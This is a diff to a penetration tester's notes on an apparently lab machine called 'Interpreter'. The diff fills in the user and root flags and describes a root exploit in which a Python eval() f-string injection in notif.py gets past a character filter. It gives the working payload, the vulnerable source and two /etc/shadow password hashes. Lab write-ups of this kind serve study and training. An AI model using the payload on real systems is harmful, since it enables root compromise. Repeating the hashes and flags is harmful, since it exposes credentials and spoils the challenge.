@@ -1,8 +1,8 @@
 # Interpreter — 10.129.244.184
 
 ## FLAGS
-- User: pending
-- Root: pending
+- User: ed27acddbdf73ba402b5de1b3ffa9965
+- Root: 7ef999c44bdab72d126ab3252e77eebf
 
 ## Recon
 - TTL=63 → Linux
@@ -102,6 +102,27 @@
 - Could inject JS code into the channel that executes as mirth user
 - OR: modify the channel to intercept notif.py traffic and see what format it expects
 
-## Two Paths Forward
-1. Modify Mirth channel JS to get better foothold or intercept notif.py traffic
-2. Find which field notif.py actually eval's (it DOES compute age from DOB)
+## Privesc: notif.py eval() injection → ROOT
+
+### Discovery
+- Format string test: `{0}` in firstname → returned `0` (positional arg worked)
+- `{__class__}` → `[EVAL_ERROR] name '__class__' is not defined` — confirms eval()!
+- `{7+7}` → `14` — arithmetic eval confirmed
+
+### Root Cause (from source via eval RCE)
+```python
+template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
+return eval(f"f'''{template}'''")
+```
+- User input is interpolated into an f-string template, then `eval()`'d
+- Regex filter: `^[a-zA-Z0-9._'"(){}=+/]+$` — allows `{}()'"` which is enough
+- No spaces allowed, but `__import__('os').popen('id').read()` has none
+
+### Exploit
+- `{__import__('os').popen('id').read()}` in firstname field → `uid=0(root)`
+- Read both flags, /etc/shadow, notif.py source all via eval injection
+- RCE as root without needing sedric's password at all
+
+### Shadow hashes (for reference)
+- root: `$y$j9T$o.VVihLzQteSMxpHLdRkO.$ye7gwugB75H18vxlZ9Yp8uak36M3opreZHoWrWOJto7`
+- sedric: `$y$j9T$MMATL11rB9egotaJXLTma0$VZ43M7Rr6.Ls7g8gZwoPCRWIXi6Wjv8j/d8iublq1nB`
